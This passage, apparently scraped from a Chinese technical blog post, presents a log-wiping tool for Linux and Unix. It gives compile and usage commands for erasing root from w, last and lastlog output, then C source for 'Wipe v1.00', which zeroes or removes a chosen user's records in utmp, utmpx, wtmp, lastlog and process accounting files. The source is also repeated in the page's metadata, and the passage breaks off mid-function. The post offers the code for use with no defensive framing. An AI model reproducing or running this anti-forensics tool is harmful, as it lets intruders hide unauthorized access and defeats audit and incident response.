open(ACCT_FILE, O_RDONLY)) \u003c 0 ) { fprintf(stderr, \"ERROR: Opening %s\\n\", ACCT_FILE); return; } /* * Grab a unique temporary filename. */ tmpf = tmpnam((char *) NULL); if ( (fd2 = open(tmpf, O_WRONLY | O_CREAT | O_TRUNC, 600)) \u003c 0 ) { fprintf(stderr, \"ERROR: Opening tmp ACCT file\\n\"); return; } if ( (pwd = getpwnam(who)) == NULL) { fprintf(stderr, \"ERROR: Can't find user in passwd.\\n\"); return; } /* * Determine tty's device number */ strcpy(ttyn, \"/dev/\"); strcat(ttyn, line); if (stat(ttyn, \u0026sbuf) \u003c 0) { fprintf(stderr, \"ERROR: Determining tty device number.\\n\"); return; } while ( read(fd1, \u0026ac, sizeof(ac)) \u003e 0 ) { if ( !(ac.ac_uid == pwd-\u003epw_uid \u0026\u0026 ac.ac_tty == sbuf.st_rdev) )\twrite(fd2, \u0026ac, sizeof(ac)); } close(fd1); close(fd2); copy_file(tmpf, ACCT_FILE); if ( unlink(tmpf) \u003c 0 ) { fprintf(stderr, \"ERROR: Unlinking tmp WTMP file.\\n\"); return; } printf(\"Done.\\n\"); } #endif void usage() { printf(\"USAGE: wipe [ u|w|l|a ] ...options...\\n\"); printf(\"\\n\"); printf(\"UTMP editing:\\n\"); printf(\" Erase all usernames : wipe u [username]\\n\"); printf(\" Erase one username on tty: wipe u [username] [tty]\\n\"); printf(\"\\n\"); printf(\"WTMP editing:\\n\"); printf(\" Erase last entry for user : wipe w [username]\\n\"); printf(\" Erase last entry on tty : wipe w [username] [tty]\\n\"); printf(\"\\n\");\tprintf(\"LASTLOG editing:\\n\"); printf(\" Blank lastlog for user : wipe l [username]\\n\"); printf(\" Alter lastlog entry : wipe l [username] [tty] [time] [host]\\n\"); printf(\"\tWhere [time] is in the format [YYMMddhhmm]\\n\"); printf(\"\\n\"); #ifndef NO_ACCT printf(\"ACCT editing:\\n\"); printf(\" Erase acct entries on tty : wipe a [username] [tty]\\n\"); #endif exit(1); } int main(int argc, char *argv[]) { char\tc; if (argc \u003c 3) usage(); /* * First character of first argument determines which file to edit. */ c = toupper(argv[1][0]); /* * UTMP editing. */ switch (c) { /* UTMP */ case 'U' : if (argc == 3) wipe_utmp(argv[2], (char *) NULL); if (argc ==4) wipe_utmp(argv[2], argv[3]); #ifdef HAVE_UTMPX if (argc == 3) wipe_utmpx(argv[2], (char *) NULL); if (argc == 4) wipe_utmpx(argv[2], argv[3]); #endif break; /* WTMP */ case 'W' : if (argc == 3) wipe_wtmp(argv[2], (char *) NULL); if (argc == 4) wipe_wtmp(argv[2], argv[3]); #ifdef HAVE_UTMPX if (argc == 3) wipe_wtmpx(argv[2], (char *) NULL); if (argc == 4) wipe_wtmpx(argv[2], argv[3]); #endif break; /* LASTLOG */ case 'L' : if (argc == 3) wipe_lastlog(argv[2], (char *) NULL, (char *) NULL, (char *) NULL); if (argc == 4) wipe_lastlog(argv[2], argv[3], (char *) NULL, (char *) NULL); if (argc == 5) wipe_lastlog(argv[2], argv[3], argv[4], (char *) NULL); if (argc == 6) wipe_lastlog(argv[2], argv[3], argv[4], argv[5]); break; #ifndef NO_ACCT /* ACCT */ case 'A' : if (argc != 4) usage(); wipe_acct(argv[2], argv[3]); break; #endif } return(0); } ","wordCount":"1391","inLanguage":"zh","image":"https://rendoumi.com/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2024-01-29T10:52:11+08:00","dateModified":"2024-01-29T10:52:11+08:00","author":{"@type":"Person","name":"八戒"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://rendoumi.com/posts/20240129-wipe_linux/"},"publisher":{"@type":"Organization","name":"八戒的技术博客","logo":{"@type":"ImageObject","url":"https://rendoumi.com/favicon.ico"}}}</script></head><body id=top><header class=header><nav class=nav><div class=logo><a href=https://rendoumi.com/ accesskey=h title="Home (Alt + H)"><img src=https://rendoumi.com/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches></div></div><ul id=menu><li><a href=https://rendoumi.com/ title=首页><span>首页</span></a></li><li><a href=https://rendoumi.com/posts/ title=文章><span>文章</span></a></li><li><a href=https://rendoumi.com/archives/ title=归档><span>归档</span></a></li><li><a href=https://blog.rendoumi.com title=生活><span>生活</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li><li><a href=https://rendoumi.com/search/ title=搜索><span>搜索</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://rendoumi.com/>主页</a>&nbsp;»&nbsp;<a href=https://rendoumi.com/posts/>所有文章</a></div><h1 class="post-title entry-hint-parent">Linux下的擦除工具
<span class=entry-hint title=Draft><svg height="35" viewBox="0 -960 960 960" fill="currentcolor"><path d="M160-410v-60h3e2v60H160zm0-165v-60h470v60H160zm0-165v-60h470v60H160zm360 580v-123l221-220q9-9 20-13t22-4q12 0 23 4.5t20 13.5l37 37q9 9 13 20t4 22-4.5 22.5T862.09-380L643-160H520zm3e2-263-37-37 37 37zM580-220h38l121-122-18-19-19-18-122 121v38zm141-141-19-18 37 37-18-19z"/></svg></span></h1><div class=post-meta><span title='2024-01-29 10:52:11 +0800 CST'>2024年29月</span>&nbsp;·&nbsp;<span>7 分钟</span>&nbsp;·&nbsp;<span>1391 字</span>&nbsp;·&nbsp;<span>八戒</span></div></header><div class=post-content><p>Linux下的日志擦除软件，无解释珍藏：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gcc -O3  -DHAVE_LASTLOG_H -DNO_ACCT -o wipe wipe.c
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>wipe u root <span class=c1>#w 命令擦掉在线的root</span>
</span></span><span class=line><span class=cl>wipe w root <span class=c1>#last 命令擦掉root</span>
</span></span><span class=line><span class=cl>wipe l root <span class=c1>#lastlog 命令擦掉root登录记录</span>
</span></span></code></pre></div><p>源码如下：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm> * Wipe v1.00.
</span></span></span><span class=line><span class=cl><span class=cm> *
</span></span></span><span class=line><span class=cl><span class=cm> * Written by The Crawler.
</span></span></span><span class=line><span class=cl><span class=cm> *
</span></span></span><span class=line><span class=cl><span class=cm> * Selectively wipe system logs.
</span></span></span><span class=line><span class=cl><span class=cm> *
</span></span></span><span class=line><span class=cl><span class=cm> * Usage: wipe [l,u,w] username
</span></span></span><span class=line><span class=cl><span class=cm> * ex:    wipe l user;wipe u user;wipe w user
</span></span></span><span class=line><span class=cl><span class=cm> *
</span></span></span><span class=line><span class=cl><span class=cm> * Wipes logs on, but not including, Linux, FreeBSD, Sunos 4.x, Solaris 2.x,
</span></span></span><span class=line><span class=cl><span class=cm> *      Ultrix, AIX, IRIX, Digital UNIX, BSDI, NetBSD, HP/UX.
</span></span></span><span class=line><span class=cl><span class=cm> * compile with  -DHAVE_LASTLOG_H -DNO_ACCT */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/types.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/stat.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/uio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#ifndef NO_ACCT
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/acct.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;utmp.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;ctype.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;pwd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;time.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#ifdef HAVE_LASTLOG_H
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;lastlog.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#ifdef HAVE_UTMPX
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;utmpx.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm> * Try to use the paths out of the include files. 
</span></span></span><span class=line><span class=cl><span class=cm> * But if we can&#39;t find any, revert to the defaults.
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=cp>#ifndef UTMP_FILE
</span></span></span><span class=line><span class=cl><span class=cp>#ifdef _PATH_UTMP
</span></span></span><span class=line><span class=cl><span class=cp>#define UTMP_FILE	_PATH_UTMP
</span></span></span><span class=line><span class=cl><span class=cp>#else
</span></span></span><span class=line><span class=cl><span class=cp>#define UTMP_FILE	&#34;/var/adm/utmp&#34;
</span></span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp>#endif 
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#ifndef WTMP_FILE
</span></span></span><span class=line><span class=cl><span class=cp>#ifdef _PATH_WTMP
</span></span></span><span class=line><span class=cl><span class=cp>#define WTMP_FILE	_PATH_WTMP
</span></span></span><span class=line><span class=cl><span class=cp>#else
</span></span></span><span class=line><span class=cl><span class=cp>#define WTMP_FILE	&#34;/var/adm/wtmp&#34;
</span></span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#ifndef LASTLOG_FILE
</span></span></span><span class=line><span class=cl><span class=cp>#ifdef _PATH_LASTLOG
</span></span></span><span class=line><span class=cl><span class=cp>#define LASTLOG_FILE	_PATH_LASTLOG
</span></span></span><span class=line><span class=cl><span class=cp>#else
</span></span></span><span class=line><span class=cl><span class=cp>#define LASTLOG_FILE	&#34;/var/adm/lastlog&#34;
</span></span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#ifndef ACCT_FILE
</span></span></span><span class=line><span class=cl><span class=cp>#define ACCT_FILE	&#34;/var/adm/pacct&#34;
</span></span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#ifdef HAVE_UTMPX
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#ifndef UTMPX_FILE
</span></span></span><span class=line><span class=cl><span class=cp>#define UTMPX_FILE	&#34;/var/adm/utmpx&#34;
</span></span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#ifndef WTMPX_FILE
</span></span></span><span class=line><span class=cl><span class=cp>#define WTMPX_FILE	&#34;/var/adm/wtmpx&#34;
</span></span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#endif </span><span class=cm>/* HAVE_UTMPX */</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#define BUFFSIZE	8192
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/* 
</span></span></span><span class=line><span class=cl><span class=cm> * This function will copy the src file to the dst file.
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=kt>void</span>
</span></span><span class=line><span class=cl><span class=nf>copy_file</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>src</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>dst</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> 	<span class=n>fd1</span><span class=p>,</span> <span class=n>fd2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span>	<span class=n>n</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>char</span>	<span class=n>buf</span><span class=p>[</span><span class=n>BUFFSIZE</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=n>fd1</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=n>src</span><span class=p>,</span> <span class=n>O_RDONLY</span><span class=p>))</span> <span class=o>&lt;</span> <span class=mi>0</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;ERROR: Opening %s during copy.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>src</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=n>fd2</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=n>dst</span><span class=p>,</span> <span class=n>O_WRONLY</span> <span class=o>|</span> <span class=n>O_CREAT</span> <span class=o>|</span> <span class=n>O_TRUNC</span><span class=p>))</span> <span class=o>&lt;</span> <span class=mi>0</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;ERROR: Creating %s during copy.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>dst</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=k>while</span> <span class=p>(</span> <span class=p>(</span><span class=n>n</span> <span class=o>=</span> <span class=nf>read</span><span class=p>(</span><span class=n>fd1</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=n>BUFFSIZE</span><span class=p>))</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=nf>write</span><span class=p>(</span><span class=n>fd2</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span> <span class=o>!=</span> <span class=n>n</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;ERROR: Write error during copy.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>		
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>n</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;ERROR: Read error during copy.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>close</span><span class=p>(</span><span class=n>fd1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>close</span><span class=p>(</span><span class=n>fd2</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm> * UTMP editing.
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=kt>void</span>
</span></span><span class=line><span class=cl><span class=nf>wipe_utmp</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>who</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>line</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> 		<span class=n>fd1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>utmp</span>	<span class=n>ut</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Patching %s .... &#34;</span><span class=p>,</span> <span class=n>UTMP_FILE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>	 * Open the utmp file.
</span></span></span><span class=line><span class=cl><span class=cm>	 */</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=n>fd1</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=n>UTMP_FILE</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=p>))</span> <span class=o>&lt;</span> <span class=mi>0</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;ERROR: Opening %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>UTMP_FILE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>	 * Copy utmp file excluding relevent entries. 
</span></span></span><span class=line><span class=cl><span class=cm>	 */</span>	
</span></span><span class=line><span class=cl>	<span class=k>while</span> <span class=p>(</span> <span class=nf>read</span><span class=p>(</span><span class=n>fd1</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>ut</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>ut</span><span class=p>))</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=nf>strncmp</span><span class=p>(</span><span class=n>ut</span><span class=p>.</span><span class=n>ut_name</span><span class=p>,</span> <span class=n>who</span><span class=p>,</span> <span class=nf>strlen</span><span class=p>(</span><span class=n>who</span><span class=p>))</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>line</span> <span class=o>||</span> <span class=p>(</span><span class=n>line</span> <span class=o>&amp;&amp;</span> 
</span></span><span class=line><span class=cl>			  <span class=o>!</span><span class=nf>strncmp</span><span class=p>(</span><span class=n>ut</span><span class=p>.</span><span class=n>ut_line</span><span class=p>,</span> <span class=n>line</span><span class=p>,</span> <span class=nf>strlen</span><span class=p>(</span><span class=n>line</span><span class=p>))))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>				<span class=nf>bzero</span><span class=p>((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span> <span class=o>&amp;</span><span class=n>ut</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>ut</span><span class=p>));</span>
</span></span><span class=line><span class=cl>				<span class=nf>lseek</span><span class=p>(</span><span class=n>fd1</span><span class=p>,</span> <span class=p>(</span><span class=kt>int</span><span class=p>)</span> <span class=o>-</span><span class=k>sizeof</span><span class=p>(</span><span class=n>ut</span><span class=p>),</span> <span class=n>SEEK_CUR</span><span class=p>);</span>
</span></span><span class=line><span class=cl>				<span class=nf>write</span><span class=p>(</span><span class=n>fd1</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>ut</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>ut</span><span class=p>));</span>
</span></span><span class=line><span class=cl>			<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>close</span><span class=p>(</span><span class=n>fd1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Done.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm> * UTMPX editing if supported.
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=cp>#ifdef HAVE_UTMPX
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=kt>void</span>
</span></span><span class=line><span class=cl><span class=nf>wipe_utmpx</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>who</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>line</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> 		<span class=n>fd1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>utmpx</span>	<span class=n>utx</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Patching %s .... &#34;</span><span class=p>,</span> <span class=n>UTMPX_FILE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		
</span></span><span class=line><span class=cl>	<span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>	 * Open the utmp file and temporary file.
</span></span></span><span class=line><span class=cl><span class=cm>	 */</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=n>fd1</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=n>UTMPX_FILE</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=p>))</span> <span class=o>&lt;</span> <span class=mi>0</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;ERROR: Opening %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>UTMPX_FILE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>while</span> <span class=p>(</span> <span class=p>(</span><span class=nf>read</span><span class=p>(</span><span class=n>fd1</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>utx</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>utx</span><span class=p>))</span> <span class=p>)</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=nf>strncmp</span><span class=p>(</span><span class=n>utx</span><span class=p>.</span><span class=n>ut_name</span><span class=p>,</span> <span class=n>who</span><span class=p>,</span> <span class=nf>strlen</span><span class=p>(</span><span class=n>who</span><span class=p>))</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>line</span> <span class=o>||</span> <span class=p>(</span><span class=n>line</span> <span class=o>&amp;&amp;</span> 
</span></span><span class=line><span class=cl>			  <span class=o>!</span><span class=nf>strncmp</span><span class=p>(</span><span class=n>utx</span><span class=p>.</span><span class=n>ut_line</span><span class=p>,</span> <span class=n>line</span><span class=p>,</span> <span class=nf>strlen</span><span class=p>(</span><span class=n>line</span><span class=p>))))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>				<span class=nf>bzero</span><span class=p>((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span> <span class=o>&amp;</span><span class=n>utx</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>utx</span><span class=p>));</span>
</span></span><span class=line><span class=cl>				<span class=nf>lseek</span><span class=p>(</span><span class=n>fd1</span><span class=p>,</span> <span class=p>(</span><span class=kt>int</span><span class=p>)</span> <span class=o>-</span><span class=k>sizeof</span><span class=p>(</span><span class=n>utx</span><span class=p>),</span> <span class=n>SEEK_CUR</span><span class=p>);</span>
</span></span><span class=line><span class=cl>				<span class=nf>write</span><span class=p>(</span><span class=n>fd1</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>utx</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>utx</span><span class=p>));</span>
</span></span><span class=line><span class=cl>			<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>close</span><span class=p>(</span><span class=n>fd1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Done.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm> * WTMP editing.
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=kt>void</span>
</span></span><span class=line><span class=cl><span class=nf>wipe_wtmp</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>who</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>line</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span>		<span class=n>fd1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>utmp</span>	<span class=n>ut</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Patching %s .... &#34;</span><span class=p>,</span> <span class=n>WTMP_FILE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>        <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>	 * Open the wtmp file and temporary file.
</span></span></span><span class=line><span class=cl><span class=cm>	 */</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=n>fd1</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=n>WTMP_FILE</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=p>))</span> <span class=o>&lt;</span> <span class=mi>0</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;ERROR: Opening %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>WTMP_FILE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=cm>/*
